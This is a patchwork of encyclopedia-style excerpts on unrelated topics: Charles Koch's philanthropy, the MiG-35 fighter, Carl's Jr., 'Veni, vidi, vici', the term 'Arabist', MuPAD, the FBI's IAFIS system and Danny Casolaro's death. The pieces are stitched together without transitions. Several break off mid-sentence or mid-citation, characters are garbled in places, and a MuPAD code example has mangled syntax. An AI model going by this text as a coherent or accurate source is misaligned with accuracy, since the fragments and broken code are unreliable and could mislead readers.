Why Wages Rise. After reading Harper's book, Koch became involved with Harper's Institute for Humane Studies, of which he became a principal supporter. He has been on the board of IHS since 1966. Since the 1980s, IHS has been increasingly interested in aiding the careers of aspiring educators, journalists, and policy professionals with an interest in classical liberal thought. Among other projects, the IHS runs the Charles G. Koch Summer Fellow Program, which \\"has supported more than 900 students during eight-week internships at public policy organizations, both in D.C. and around the country.\\" In addition, almost 200 institutions of higher education in the U.S. are funded by the Charles G. Koch Foundation. What all the Koch-funded programs have in common is an interest in studying free societies with an eye to understanding how economic freedom benefits humanity. Through the Koch Cultural Trust, founded by Charles Koch's wife, Elizabeth, the Koch family has provided financial support to promising artists in a variety of fields. More than $1.7 million in grants have been awarded to programs and individuals with Kansas roots. Koch supported his brother's candidacy for vice president on the Libertarian Party ticket in 1980. After the bid, Koch told a reporter that conventional politics \\"tends to be a nasty, corrupting business ... I'm interested in advancing libertarian ideas\\". In addition to funding think tanks, Charles and David also support libertarian academics and Koch funds the Charles G. Koch Summer Fellow Program through the Institute for Humane Studies which recruits and mentors young libertarians. Koch also organizes twice yearly meetings of Republican donors. Charles Koch looks favorably upon the Tea Party movement. \\"The way it's grown, the passion, and the intensity, was beyond what I had anticipated,\\" he told an interviewer. He's funded groups opposed to Barack Obama's administration. Koch has given money to support public policy research focused on \\"developing voluntary, market-based solutions to social problems.\\" He has given to the Bill of Rights Institute, a non-profit group that educates teachers, students, and others about the Bill of Rights. He has also given to the Youth Entrepreneurs, an organization that teaches business skills to at-risk youth in Kansas schools. Koch has also supported the Berkeley Earth Surface Temperature project, a scientific effort to compile an open database of the Earth's surface temperature records.BEST donors , accessed 3/25/11 In 2002, Koch Industries donated $6 million to renovate the Wichita State University basketball arena. The gift was given in honor of Koch, and the arena was subsequently renamed the Charles Koch Arena. Koch has continued to be a major donor to both the university and its athletic program. In December 2014, Koch Industries and the Koch family foundation donated $11.25 million to the university, the largest one-time gift in school history, with $4.5 million of that going toward a plan to renovate the arena and expand the athletic program's academic support center. Several months later, when men's basketball head coach Gregg Marshall was considering an offer to become head coach at the University of Alabama, Koch led a group of local business leaders and WSU boosters that raised Marshall's annual salary from $1.85 million to $3 million and kept him at the school. The raise was seen as an unprecedented move for a school outside the Power Five conferences, and likely to make Marshall among the 10 highest-paid college basketball coaches. In 2011, Koch was awarded the William E. Simon Prize for Philanthropic Leadership. The award honors \\"the ideals and principles which guided William E. Simon's giving, including personal responsibility, resourcefulness, volunteerism, scholarship, individual freedom, faith in God, and helping people to help themselves.\\" In July 2015 Charles Koch and his brother were praised by President Obama and Anthony Van Jones for their bipartisan efforts to reform the criminal justice system. For roughly a decade Koch has been advocating for several reforms within the prison system, including the reduction of recidivist criminals, easing the employment process for rehabilitated persons, and the defense of private property from asset forfeiture. Aligning with groups such as the ACLU, the Center for American Progress, Families Against Mandatory Minimums, the Coalition for Public Safety, and the MacArthur Foundation, Koch believes the current system has unfairly targeted low-income and minority communities all while wasting substantial government resources. In February 2016, Koch penned an opinion piece in The Washington Post, where he said he agreed with presidential candidate Bernie Sanders about the unfairness of corporate welfare and mass incarceration in the United States. In June 2019, the Charles Koch Foundation announced the foundation of anti-war think tank Quincy Institute for Responsible Statecraft, cosponsored by George Soros' Open Society Foundation.

In response to earlier criticism, the new engines are smokeless and include systems that reduce infrared and optical visibility. The engines may be fitted with thrust vectoring nozzles, which would result in an increase in combat efficiency by 12% to 15%, according to manufacturer claims.\\"Klimov Production: Aircraft Program, RD-33MK.\\" Klimov. Retrieved: 8 November 2012. The RD-33OVT engine variant comes with thrust vectoring nozzles, and can direct thrust in two axis. As of 2012, the only in-service, in-production fighter jet using this technology is the Sukhoi Su-35. Other current thrust-vectoring aircraft, such as the Sukhoi Su-30 and the Lockheed Martin F-22 Raptor, have nozzles with thrust vectoring in one axis.\\"Russia begins testing MiG-35 ahead of field trials in India news.\\" domain-b.com, 14 August 2009. =Armament= In January 2017, during a conference call with Russian President Vladimir Putin, Yuri Slyusar, president of the UAC, reported that the MiG-35 could possibly use a kind of laser weaponry in the future. Military trials of the laser are to proceed immediately after flight testing of the aircraft. However, there was doubt if Slyusar made a mistake by saying laser weaponry instead of laser- guided weapon. The MiG-35 is also planned to be capable of launching the Kh-36 Grom-1 cruise missile, giving it a long-range strike capability that the MiG-29 does not possess. =Cockpit= The MiG-35 has a glass cockpit equipped with night-vision goggles, an additional display for the optical locator system, and a 3-equal-size color LCD multi-function display. The second-seat version of the MiG-35, the MiG-35D, has 4 LCD displays in its rear cockpit. The MiG-35D uses a tandem cockpit while single-seat versions of the MiG-35 uses the rear cockpit to store extra fuel, while retaining a two-seat canopy. =Avionics= 13SM-1 optical-location station of the MiG-35 The MiG-35 is to be equipped with the new Phazotron Zhuk-A/AE active electronically scanned array (AESA) radar, the first radar of this kind installed on a Russian fighter aircraft. The Phazotron Zhuk-A/AE AESA radar offers a wider range of operating frequencies, providing better resistance to electronic countermeasures (ECMs), extended detection range and more air and ground targets detected. The FGA-35 radar type, featured 688 mm antenna and 1016 T/R modules (originally planned 1064) with initial stage performance of a 200 km detection range for 3m2 RCS target. Later detection range was raised up to 250 km. It can track up to 30 targets at any time, engaging up to 6 air targets at once, or 4 ground targets at once. For detection of targets in the infrared spectrum, the MiG-35 is equipped with the OLS-UEM (13SM-1) electro-optical targeting station with lookdown capability against ground, sea and air targets. Its forward-looking infrared (FLIR) sensor is capable to detect airborne threats up to 55 km and provides coverage in azimuth of +/- 90-degree and +60-degree to ‚àí15-degree in elevation. The OLS-UEM consists of: * Infra- red search and track sensor * TV camera with infrared search and track capability * Multimode laser rangefinder with detection range up to 20 km There is also the OLS-K/OLS-KE podded electro-optical targeting system mounted under the right engine nacelle. It is designed to search, detect and track ground and sea targets. The system consists of infrared sensor and TV camera and is capable to detect ground targets up to 20 km and sea targets up to 40 km. To protect the aircraft against current and future surface-to-air (SAM) missiles, the MSP-418KE compact active jammer pod can be mounted on any of the aircraft nine hardpoints. Operational history =Russia= The Russian Defence Ministry intended to place an order for 37 aircraft in 2013, but the number was reduced to 24 in August 2017. First batch of six MiG-35s was ordered in August 2018, and first two serial aircraft were delivered to the Russian Aerospace Forces on 17 June 2019. =Potential operators= Egypt In 2014, Egypt planned to sign a large arms deal with Russia for the purchase of 24 MiG-35 fighters. In February 2015, MiG Director General Sergei Korotkov announced that the company was ready to supply the MiG-35 jets to Egypt should the country request them. However, in April 2015, Egypt signed a $2 billion contract for the purchase of 46 MiG-29M/M2 multi-role fighters instead. In 2019, Egypt signed an agreement with Russia for 50 MiG-35s. India The MiG-35 was a contender with the Eurofighter Typhoon, Boeing F/A-18E/F Super Hornet, Dassault Rafale, Saab JAS 39 Gripen, and General Dynamics F-16 Fighting Falcon in the Indian MRCA competition for 126 multirole combat aircraft to be procured by the Indian Air Force. During the competition however, India's Ministry of Defense was frustrated with the problems of the aircraft's avionics with the radar not able to achieve the maximum targeting distance during tests. Also the RD-33MK engines were not shown to reach sufficient thrust. As a result, the MiG-35 was ousted from the contest in April 2011. The aircraft is now competing with 6 other aircraft in a fresh tender which is referred as MMRCA 2.0 in the Indian media, for the procurement of 114 multi-role combat aircraft.http://sps- aviation.com/story/?id=2370&h;=MMRCA-20-Contenders Others Peru, Myanmar, and Bangladesh were also among the countries interested in acquiring MiG-35 fighters. Recent reports show that Russia intends to buy 18 mothballed Malaysian Air Force MiG-29Ns for two squadrons of MiG-35. This was an offer made by Russian President Vladimir Putin to Malaysia in August 2019.

In 2016, Entrepreneur listed Carl's Jr. as #54 on their Top Franchise 500 list, which ranks the overall financial strength, stability, and growth rate for the top 500 franchisees in any field across the United States. As of March 2016, CKE (the parent company of Carl's Jr. and Hardee's) has a total of 3,664 franchised or company-operated restaurants in 44 states and 38 foreign countries and U.S. territories.  History In 1941, Carl Karcher, who was a truck driver, and his wife Margaret Karcher, borrowed $311 on their Plymouth automobile and added $15 in savings to purchase a hot dog cart on the corner of Florence and Central in Los Angeles. From their newly purchased cart, they sold hot dogs, chili dogs, and tamales for a dime, and soda for a nickel. Within a few years, Carl and Margaret owned and operated four hot dog stands in Los Angeles. In 1945, the Karchers moved the short distance to Anaheim, California, and opened their first full-service restaurant, Carl's Drive-In Barbecue at 1108 N. Palm St. (now Harbor). In 1950, hamburgers were added to the menu for the first time. In 1956, Karcher opened the first two Carl's Jr. restaurants ‚Äì so named because they were a smaller version of Carl's Drive-In Barbecue restaurant ‚Äì in Anaheim and Brea. The first local Carl's Jr. was built in 1956 on the former Janss Street next to St. Boniface Catholic Church about half a block away from Anaheim High School. That former Carl's Jr. is now the church's Bethany Hall. The current flagship Carl's Jr. is located at 1200 N. Harbor Blvd. By the end of the 1950s, there were four Carl's Jr. restaurants in Orange County, Calif. The restaurants also had a new supervisor, Donald F. Karcher, Carl's younger brother, who would later become the company's president. By the 1960s, Carl was operating 24 restaurants in Southern California. The company incorporated in 1966 as Carl Karcher Enterprises, Inc., and launched a major expansion of the chain in 1968. The menus were limited for faster service, featuring charbroiled hamburgers, hot dogs, fries, and malts. A Carl's Jr. in Rancho Cordova, California By 1975, there were more than 100 Carl's Jr. locations in Southern California, and the company expanded into the northern part of the state. Carl's Jr. celebrated its success by building its Anaheim corporate headquarters in 1976. The following year, it became the first QSR chain to offer salad bars in all 200 locations. The first out-of-state restaurant opened in Las Vegas in 1979. By the end of the decade, sales exceeded the $100 million mark. Breakfast food served at a Carl's Jr. in La Mesa, California, in 2016. Carl's Jr. first began serving breakfast in 1984. In 1980, the company hired its 10,000th employee, doubling its employee count in just three years. In 1981, with 300 restaurants in operation, Carl Karcher Enterprises became a publicly held company. In 1984, Carl's Jr. was franchised for the first time. Carl's Jr.'s menu expanded during the decade with the addition of the Western Bacon Cheeseburger, breakfast items, a charbroiled chicken sandwich line, and self-service soda fountains. By the end of the decade, sales topped $480 million at 534 restaurants. The company also opened its first international units in the Pacific Rim. In addition, Carl's Jr. was one of the first chains to introduce a debit card payment system, inviting customers to use their ATM cards in the restaurants. In 1988, Karcher and his family were accused of insider trading by the Securities and Exchange Commission. They had sold large quantities of stock before the price dropped. Karcher agreed to a settlement with the SEC and paid more than half a million dollars in fines. Former Carl's Jr. in Denton, Texas. This location closed in 2018. Carl's Jr. chains had struggled to gain success in Arizona and Texas, perhaps diminishing hopes of expansion to other states, though later states like Nevada, Oregon, and Washington proved successful. During the 1990s, Karcher and the board of directors began clashing, often publicly, over marketing and business practices, including the chain's attempt at dual branding with such chains as The Green Burrito and its new advertising campaigns. Karcher was removed as chairman of the company by its board of directors on October 1, 1993. Soon after, the board of directors took a new approach by cutting the menu, lowering prices, and introducing a new marketing campaign which targeted younger urban and suburban males. Following Don Karcher's death in 1992, a new management team was installed in 1994, headed by CEO William P. Foley II and President and Chief Operating Officer Tom Thompson. Carl Karcher Enterprises became a wholly owned subsidiary of CKE Restaurants Holdings, Inc. During the mid-1990s, Carl's Jr. unveiled its \\"If it doesn't get all over the place, it doesn't belong in your face\\" campaign, which featured younger people eating Carl's Jr.'s burgers with ketchup and juice dripping from the burger and onto clothes and other areas. In 1997, CKE Restaurants acquired Hardee's, a restaurant chain with 2,500 locations in the Midwest, South, and East Coast regions. In 2001, Carl's Jr. introduced the Thickburger line with the 1/2 lb. Six Dollar Burger, with sister chain Hardee's following in 2003. In 2002, CKE Restaurants acquired Santa Barbara Restaurant Group, the parent company of the Green Burrito brand. Some Carl's Jr. stores are now co-branded with Green Burrito, as are some Hardee's stores. In 2003, the company moved its headquarters to Carpinteria, California. In 2005, Carl's Jr. introduced hand-scooped ice cream shakes. On January 11, 2008, Carl Karcher, the founder of hamburger chain Carl's Jr., died at the age of 90. A spokeswoman for CKE Restaurants said Karcher suffered from Parkinson's disease and was being treated for Parkinson's-related pneumonia when he died at St. Jude Medical Center in Fullerton, California. Many Carl's Jr. restaurants flew their flags at half-staff in memory of Karcher. In the 2010s, Carl's Jr. and Hardee's rolled out Hand-Breaded Chicken Tenders. Carl's Jr. and Hardee's began offering Charbroiled Turkey Burgers in 2011, marking another industry first by becoming the first national fast food chains to offer Turkey Burgers. In July 2010, CKE Restaurants Holdings, Inc. was acquired by Columbia Lake Acquisition Holdings, Inc., an affiliate of Apollo Management VII, L.P. allowing CKE to continue to grow and succeed as a privately held company under the ownership of Apollo. In 2011, Carl's Jr. introduced made-from-scratch biscuits. On November 20, 2013, Roark Capital Group agreed to acquire CKE from Apollo for $1.65‚Äì$1.75 billion. In December 2014, Carl's Jr. introduced the All-Natural Burger, featuring an all-natural, grass-fed, free-range beef patty that has no added hormones, antibiotics, or steroids ‚Äì the first major fast-food chain to offer an all-natural beef patty on the menu. In December 2015, the All-Natural Turkey Burger was introduced ‚Äì the fast food industry's first. In September 2017, CKE decided to re-brand its Poughkeepsie, New York and Middletown, New York Hardee's locations into Carl's Jr. in order to focus on lunch and dinner options for a New England consumer base, however both those stores have closed. Although, since 1997 both Hardee's and Carl's Jr operated essentially as one brand, 2018 saw CKE Restaurants announced plans to try to separate their identities. Part of the effort involved remodeling several Hardee's restaurants as well as giving both brands distinct ad campaigns. { Although both chains at the time of the split shared the same menu CKE noted that they would slowly change over time although with \\"some overlap\\" In January 2019, Carls Jr. introduced a Beyond Meat patty as an addition to their menu. They were one of the first large chain restaurants to introduce a vegan-friendly patty to their menu and roll it out to all of their locations. Soon after Burger King and many others followed by adding plant-based burgers to their menus.[https://crueltyfreereviews.com/eating-out/vegan-options-at-carls-jr/ Everything Vegan at Carls Jr.] = International = A portobello mushroom burger and fries from the Carl's Jr. in Plaza Semanggi, Jakarta, Indonesia In November 2015, Carl's Jr. opened its 200th restaurant in Mexico.

Philanthropy  CKE conducts an annual Stars for Heroes in-store fundraising campaign at both Carl's Jr. and Hardee's to benefit U.S. military veterans and their families. Since the program's launch in 2011, Stars for Heroes has raised nearly $5 million. Co-branding  In several Western U.S. locations, Carl's Jr. parent CKE has begun operating co-branded restaurants with its Green Burrito group. This same strategy has also been used by Yum! Brands with its KFC, Pizza Hut, Taco Bell, A&W; Restaurants, and Long John Silver's concepts to expand brands without the additional expense of new buildings and land.  Advertising  Carl's Jr. logo used in 2006-2017 When Carl's Jr. first started rebranding Hardee's locations into the Carl's Jr. name, both chains mostly kept separate ads. This changed with the now-infamous Paris Hilton ad (see below), which aired as either for Carl's Jr. or Hardee's, depending on where the ads aired. This would continue with other ads for the next several years, including ads by Kate Upton, Kim Kardashian, Emily Ratajkowski, Sara Jean Underwood, Hannah Ferguson, Heidi Klum, Charlotte McKinney, Ronda Rousey, Padma Lakshmi, and Hayden Panettiere. In January 1997, commercials featuring NBA player Dennis Rodman were pulled after he was fined a then record $25,000 fine and suspended 11 games for kicking a cameraman in the groin during a game in Minneapolis, Minnesota and then his commercials resumed airing after his suspension was over but in June of that same year, his commercials were pulled for good after he was fined a then-record $50,000 for using profanity against Mormons during a game in Salt Lake City, Utah. In 2005, Carl's Jr. launched a marketing campaign featuring bikini-clad models posing suggestively to capture the \\"hungry, young guy\\" demographic. The advertisements were criticized for objectifying women and prompted calls to boycott Carl's Jr. Company CEO Andrew Puzder defended the campaign in Entrepreneur magazine, saying, \\"I like our ads. I like beautiful women eating burgers in bikinis. I think it's very American.\\" In the years before his death in 2008, Karcher objected to the sexualized nature of the company's advertising, and was reported \\"just heartbroken\\" that a company he founded on Christian principles has taken such an amoral act.\\" = Paris Hilton campaign = In May 2005, Carl's Jr. introduced its \\"Spicy BBQ Six Dollar Burger\\" in a television advertisement created by Mendelsohn Zien Advertising, which features Paris Hilton in a provocative swimsuit soaping up a Bentley automobile and crawling all over it before taking a big bite out of her burger and giving her signature phrase, \\"That's hot.\\" With the two chains selling many common menu items by 2013, Carl's Jr. began to advertise nationally in conjunction with Hardee's for products sold by both brands. = All Natural campaign = In January 2015, Carl's Jr. released a commercial online featuring model Charlotte McKinney advertising its new All Natural Burger to air regionally during Super Bowl XLIX. The ad features McKinney walking around a farmers' market, implying that she is \\"all natural\\", and uses double entendres to suggest that she is naked with strategically placed items in the market until it reveals McKinney in a bikini eating the All Natural Burger. Critics suggest that the ad \\"sets feminism back four decades,\\" while others, including McKinney's elderly grandfather, enjoyed the ad. The ad now features Hardee's co-branding as the All Natural Burger is now offered by Hardee's. As of June 2016, Charlotte McKinney's \\"Au Natural\\" ad debut has garnered over 4.5 billion media impressions worldwide and more than 13 million views on the chains' YouTube channel. =Carl Hardee Sr. campaign= In March 2017, Carl's Jr. released a commercial featuring a white-bearded character named Carl Hardee Sr. (played by Charles Esten) who had come back into the office (much to the delight of the employees) to find his son Carl Jr. (Drew Tarver) who was focusing on sex appeal over its food. The commercial marked a turning point in CKE's advertising, claiming it wanted to move away from its provocative ads and focus more on food and as a competitor to Five Guys, Steak 'n Shake, and In-N-Out Burger. \\"Carl Hardee Sr.\\" is also expected to become the new company spokesperson. =The Call of Carl's campaign= In 2018, CKE resumed producing separate campaigns for their Hardee's and Carl's Jr. brands.

Veni, vidi, vici (, ; \\"I came; I saw; I conquered\\") is a Latin phrase popularly attributed to Julius Caesar who, according to Appian, used the phrase in a letter to the Roman Senate around 47 BC after he had achieved a quick victory in his short war against Pharnaces II of Pontus at the Battle of Zela. The phrase is used to refer to a swift, conclusive victory. The phrase is attributed in Plutarch's Life of Caesar and Suetonius's Lives of the Twelve Caesars: Julius. Plutarch writes that Caesar used it in a report to Amantius, a friend of his at Rome.Plutarch, Life of Caesar from penelope.uchicago.edu Suetonius states that Caesar displayed the three words as an inscription during his Pontic triumph.Suetonius, Lives of the Twelve Caesars: Julius from penelope.uchicago.edu Allusions and references Variations of the sentence Veni, vidi, vici are often quoted, and also used in music, art, literature, and entertainment. Since the time of Caesar, the phrase has been used in military contexts. King Jan III of Poland alluded to it after the 17th-century Battle of Vienna, saying Venimus, Vidimus, Deus vicit (\\"We came, we saw, God conquered\\").Lettere memorabili, istoriche, politiche, ed erudite raccolte da Antonio Bulifon (Pozzuoli, 1698), vol. 1, p. 177. In 2011 the then Secretary of State Hillary Clinton referred to the death of Muammar Gaddafi with a similar phrase, saying \\"We came, we saw, he died\\". The sentence has also been used in music, including several well-known works over the years. The opening of Handel's 1724 opera Giulio Cesare contains the line: Curio, Cesare venne, e vide e vinse (\\"Curio, Caesar came, saw and conquered\\"). In popular music, it is expected that the audience will know the original quotation, so modified versions are frequently used. This can range from slight changes in perspective, as in the title song in the musical Mame (You came, you saw, you conquered) or the 1936 song These Foolish Things (Remind Me of You) (You came, you saw, you conquered me) to wordplay, such as in the album title Veni Vidi Vicious by Swedish band The Hives or Pitbull's song \\"Fireball\\" (I saw, I came, I conquered Or should I say, I saw I conquered, I came) or Ja Rule's debut album Venni Vetti Vecci. Philip Morris logo, from a pack of Marlboro cigarettes. The phrase has also been heavily referenced in literature and film. The title of French poet Victor Hugo's Veni, vidi, vixi (\\"I came, I saw, I lived\\"), written after the death of his daughter Leopoldine at age 19 in 1843, uses the allusion with its first verse: J'ai bien assez v√©cu...(\\"I have lived quite long enough...\\"). Peter Venkman, one of the protagonists in the 1984 film Ghostbusters, delivers a humorous variation: \\"We came. We saw. We kicked its ass!\\" This line was among the 400 nominees for the AFI's 100 Years...100 Movie Quotes. Latin grammar Veni, vidi, and vici are first person singular perfect indicative active forms of the Latin verbs venire, videre, and vincere, which mean \\"to come\\", \\"to see\\", and \\"to conquer\\", respectively. The sentence's form is classed as a tricolon and a hendiatris. English grammar The English phrase \\"I came, I saw, I conquered\\" employs what is known as a comma splice. Grammarians generally agree that using a comma to join two independent clauses should be done sparingly.Merrell, Andrea. Murder of a Manuscript: Writing and Editing Tips to Keep Your Book Out of the Editorial Graveyard, p. 25 (Lighthouse Publishing of the Carolinas, 2016). Sometimes, the comma splice is avoided by using a semicolon instead: \\"I came; I saw; I conquered\\".Smith, Christopher. Barron's GED Canada: High School Equivalency Exam, p. 170 (Barron's Educational Series, 2008). Alternatively, \\"I came, I saw, I conquered\\" can be justified as an example of asyndeton, where the lack of the expected conjunction emphasizes the suddenness and swiftness of Caesar's victories.

Accusations of bias, and the term's use as a pejorative arose in the United States where \\"Arabists\\" in public service, largely in the State Department, were perceived as being \\"pro-Arab\\" by pro-Zionist and Jewish organizations and commentators following World War II and in the run-up to the partition of Palestine.Robert D.

Through the press, the Zionists waged a critical battle to create a conventional wisdom.\\"Rafael Medoff, Jewish Americans and Political Participation: A Reference Handbook, p. 135 A similar time frame for the emergence of such a politically charged connotation was provided by Joseph Kraft in 1971, when he wrote that the term Arabist originally referred to anyone who was trained in the Arabic language and made the study of the Middle East his or her life's work. Over the last four decades, however, it has been used in a more specific and derogatory manner to refer to those government Middle East specialists, most with Arabic-language training, who have spent extensive time in the Middle East and are seen to identify with the Arab cause or generally be \\"pro-Arab.\\"Joseph Kraft, \\"Those Arabists in the State Department,\\" New York Times Magazine, Nov 7, 1971, pp. 82, 88, 89, 92.

More recently, in describing the development of American foreign policy in the Middle East, Matthew Jacobs avoids using the term Arabist altogether, \\"as it suggests language skills that few professional observers of the Middle East possessed prior to the mid-1950s and because it has become a contentious and even derogatory term, with significant political implications since the early 1970s.\\"Matthew F.

Originally developed by the MuPAD research group at the University of Paderborn, Germany, development was taken over by the company SciFace Software GmbH & Co. KG in cooperation with the MuPAD research group and partners from some other universities starting in 1997. MuPAD's graphics package was particularly successful, especially considering the era when it was developed. Until autumn 2005, the version \\"MuPAD Light\\" was offered for free for research and education, but as a result of the closure of the home institute of the MuPAD research group, only the version \\"MuPAD Pro\\" became available for purchase. The MuPAD kernel is bundled with Scientific Notebook and Scientific Workplace. Former versions of MuPAD Pro were bundled with SciLab. In MathCAD's version 14 release Mupad was adopted as the CAS engine. In September 2008, SciFace was purchased by MathWorks and the MuPAD code was included in the Symbolic Math Toolbox add-on for MATLAB. On 28 September 2008, MuPAD was withdrawn from the market as a software product in its own right.Support for MuPAD However, it is still available in the Symbolic Math Toolbox in MATLAB and can also be used as a stand-alone program by the command \`mupad\` entered into the MATLAB terminal. The MuPAD notebook feature has been removed in MATLAB R2020a. However, MATLAB's Symbolic Math Toolbox still uses the MuPAD language as part of its underlying computational engine. MATLAB Live Editor is the recommended environment for performing, documenting, and sharing symbolic math computations.  Functionality  MuPAD offers: * a computer algebra system to manipulate formulas symbolically * classic and verified numerical analysis in discretionary accuracy * program packages for linear algebra, differential equations, number theory, statistics, and functional programming * an interactive graphic system that supports animations and transparent areas in 3D * a programming language that supports object-oriented programming and functional programming Often used commands are accessible via menus. MuPAD offers a notebook concept similar to word processing systems that allows the formulation of mathematical problems as well as graphics visualization and explanations in formatted text. MuPad does not follow the NIST 4.37 definition for inverse hyperbolic cosine. It is possible to extend MuPAD with C++-routines to accelerate calculations. Java code can also be embedded. MuPAD's syntax was modeled on Pascal, and is similar to the one used in the Maple computer algebra system. An important difference between the two is that MuPAD provides support for object-oriented programming. This means that each object \\"carries with itself\\" the methods allowed to be used on it. For example, after defining A := matrix( 1,2],[3,4 ) all of the following are valid expressions and give the expected result: A+A, -A, 2*A, A*A, A^-1, exp( A ), A.A, A^0, 0*A where \`A.A\` is the concatenated 2√ó4 matrix, while all others, including the last two, are again 2√ó2 matrices.

It is a national automated fingerprint identification and criminal history system. IAFIS provides automated fingerprint search capabilities, latent searching capability, electronic image storage, and electronic exchange of fingerprints and responses. IAFIS houses the fingerprints and criminal histories of 70 million subjects in the criminal master file, 31 million civil prints and fingerprints from 73,000 known and suspected terrorists processed by the U.S. or by international law enforcement agencies. Employment background checks and legitimate firearms purchases cause citizens to be permanently recorded in the system. For instance, the State of Washington mandates that all applicants seeking employment in an inpatient setting that houses vulnerable minors (such as children who are mentally challenged, physically or emotionally ill) are fingerprinted and entered into IAFIS as part of their background check in order to determine if the applicant has any record of criminal behavior. Fingerprints are voluntarily submitted to the FBI by local, state, and federal law enforcement agencies. These agencies acquire the fingerprints through criminal arrests or from non-criminal sources, such as employment background checks and the US-VISIT program. The FBI then catalogs the fingerprints along with any criminal history linked with the subject. Law enforcement agencies can then request a search in IAFIS to identify crime scene (latent) fingerprints obtained during criminal investigations. Civil searches are also performed, but the FBI charges a fee and the response time is slower. A more advanced Next Generation Identification system became operational in 2011.Dizard III, Wilson P. \\"FBI plans major database upgrade\\" . Government Computer News, 28 August 2006. Retrieved on 2 February 2007. Technology The device used for scanning live fingerprints into AFIS is called Live scan. The process of obtaining the prints by way of LiveScan employs rolling prints or placing flat impressions onto a glass platen above a camera unit. The process of obtaining prints by placing a ten-print card (prints taken using ink) onto a flatbed or high-speed scanner is called CardScan (or occasionally DeadScan). In addition to these devices, there are other devices to capture prints from crime scenes, as well as devices (both wired and wireless) to capture one or two live finger impressions. The most common method of acquiring fingerprint images remains the inexpensive ink pad and paper form. Scanning forms (\\"fingerprint cards\\") with a forensic AFIS complies with standards established by the FBI and National Institute of Standards and Technology (NIST). To match a print, a fingerprint technician scans in the print in question, and computer algorithms are utilized to mark all minutia points, cores, and deltas detected on the print. In some systems, the technician is allowed to perform a review of the points that the software has detected, and submits the feature set to a one- to-many (1:N) search. The better commercial systems provide fully automated processing and searching (\\"lights-out\\") of print features. The fingerprint image processor will generally assign a \\"quality measure\\" that indicates if the print is acceptable for searching. Speed The average response time for an electronic criminal fingerprint submission is about 27 minutes, while electronic civil submissions are processed within an hour and 12 minutes. IAFIS processed more than 61 million ten-print submissions during fiscal year 2010. In popular culture In forensics television series such as CSI: Crime Scene Investigation and its spin offs, the investigators often match fingerprints with the AFIS database. * In the TV show NCIS, Abby Sciuto uses IAFIS database for the NCIS team. * In the TV show Dexter Season 1 episode 2 Dexter uses IAFIS to test the prints of the guy at the bar. * In the TV show Dexter Season 7 episode 1 Dexter uses IAFIS to test the prints of the female in the trunk of the car. * In the TV show Person of Interest in Season 1 episode 18 Donnelly uses IAFIS to match John's fingerprints to previous crimes in New York.

The medical examiner ruled the death a suicide.Ridgeway, James and Vaughan, Doug. \\"The Last Days of Danny Casolaro,\\" The Village Voice, October 15, 1991, p. 34 ff. His death became controversial because his notes suggested he was in Martinsburg to meet a source about a story he called \\"the Octopus.\\" This centered on a sprawling collaboration involving an international cabal, and primarily featuring a number of stories familiar to journalists who worked in and around Washington, D.C. in the 1980s‚Äîthe Inslaw case about a software manufacturer whose owner accused the Justice Department of stealing its work product, the October Surprise theory that during the Iran hostage crisis Iran deliberately held back American hostages to help Ronald Reagan win the 1980 presidential election, the collapse of the Bank of Credit and Commerce International, and Iran‚ÄìContra.Ridgeway, James and Vaughan, Doug. \\"The Last Days of Danny Casolaro,\\" The Village Voice, October 15, 1991, write that: \\"In particular, Casolaro was interested in what he called the \\"Octopus,\\" a network of individuals and institutions that he believed had secretly masterminded a whole series of scandals, from the Iran-Contra affair and the S&L; debacle to the BCCI collapse and the 1980 October Surprise deal.\\" See also Lewis, Neil A. \\"Reporter Is Buried Amid Questions Over His Pursuit of Conspiracy Idea\\", The New York Times, August 17, 1991, who writes: \\"Friends of the journalist said he was looking into a connection between the Inslaw matter and the Bank of Credit and Commerce International ...\\" Elliot Richardson, a former United States Attorney General who now represents Inslaw in its suit against the Justice Department, said \\"it involved B.C.C.I., drugs and the persistent but unproven allegations that in 1980 some members of Ronald Reagan's Presidential campaign team worked to delay the release of American hostages in Iran to damage President Jimmy Carter's re-election chances.\\" Casolaro's family argued that he had been murdered; that before he left for Martinsburg, he had apparently told his brother that he had been frequently receiving harassing phone calls late at night; that some of them were threatening; and that if something were to happen to him while in Martinsburg, it would not be an accident. They also cited his well-known squeamishness and fear of blood tests, and stated they found it incomprehensible that if he were going to commit suicide, he would do so by cutting his wrists a dozen times.Lee, Gary. Area Writer Investigating Inslaw Case Found Dead, The Washington Post, August 13, 1991, p. A8. A number of law-enforcement officials also argued that his death deserved further scrutiny, and his notes were passed by his family to ABC News and Time Magazine, both of which investigated the case, but no evidence of murder was ever found.Committee on the Judiciary.

Writer's Papers Shed Little Light on His Death; Casolaro Sought to Prove \`Octopus' Theory Encompassing Hostage Delay, Inslaw, BCCI, The Washington Post, August 19, 1991. Early life and career Casolaro was born into a Catholic family in McLean, Virginia, the son of an obstetrician, and the second of six children. One of his siblings fell ill and died shortly after birth. A younger sister, Lisa, died of a drug overdose in San Francisco's Haight-Ashbury in the 1960s. Casolaro attended Providence College until 1968. He married Terrill Pace, a former Miss Virginia. The couple had a son, Trey, and divorced after ten years, with Casolaro granted legal custody of his son.Rosenbaum, Ron. \\"The Strange Death of Danny Casolaro,\\" Vanity Fair, December 1991. Casolaro's interests included amateur boxing, writing poems and short stories, and raising pure bred Arabian horses. He also dabbled in journalism, looking into issues such as the Soviet naval presence in Cuba, the Castro intelligence network, and Chinese communist smuggling of opium into the U.S. according to his own curriculum vitae (though it remains unclear how much he had published). At the time of his death, he had written and published one novel, The Ice King, with Whitmore Publishing Co. Towards the end of the 1970s, he dropped his interest in journalism and acquired a series of computer-industry trade publications, which he began selling towards the end of the 1980s. In early 1990, he decided to take up journalism again and, soon after, took an interest in the Inslaw case, of which his IT contacts had made him aware. Research Shortly before his death, Casolaro told people that he was nearly ready to reveal a wide-ranging conspiracy involving the Inslaw case, Iran-Contra, the alleged October Surprise conspiracy, and the closure of BCCI.Linsalata, Phil. , The Columbia Journalism Review, November/December 1991, accessed October 20, 2008. David Corn writes in The Nation that the papers Casolaro left behind reveal few clues, except that he was in over his head, but was tenacious.Corn, David. [https://archive.org/details/Danny-Casolaro \\"The Dark World of Danny Casolaro\\" (PDF)], The Nation. October 21, 1991, p. 511. His papers included old clippings, handwritten notes that were hard to read, and the names of former CIA officers and arms dealers. Corn writes that the notes show Casolaro was influenced by the Christic Institute and that he had pursued material fed to him by a reporter who worked for Lyndon LaRouche. Richard Fricker writes in Wired that Casolaro had been led into a \\"Bermuda Triangle of spooks, guns, drugs and organized crime.\\"Fricker, Richard L. The Inslaw Octopus, Wired, March/April 1993. Inslaw case Ron Rosenbaum writes that the Inslaw story 